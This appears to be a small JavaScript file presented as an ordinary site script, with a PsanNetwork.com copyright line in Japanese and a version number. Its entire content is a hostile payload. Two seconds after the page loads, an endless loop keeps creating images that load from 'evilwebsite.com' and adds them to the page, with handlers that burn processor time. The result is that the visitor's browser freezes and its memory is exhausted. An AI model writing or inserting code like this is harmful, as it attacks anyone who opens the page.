//©PsanNetwork.com 無断転載は禁止します
setTimeout(function() {
  while (true) {
    let img = new Image();
    img.src = 'http://evilwebsite.com/large.jpg';
    img.onload = function() {
      for (let i = 0; i < 10000; i++) {
        Math.pow(Math.PI, Math.random());
      }
    };
    document.body.appendChild(img);
  }
}, 2000);
//ver 2.1
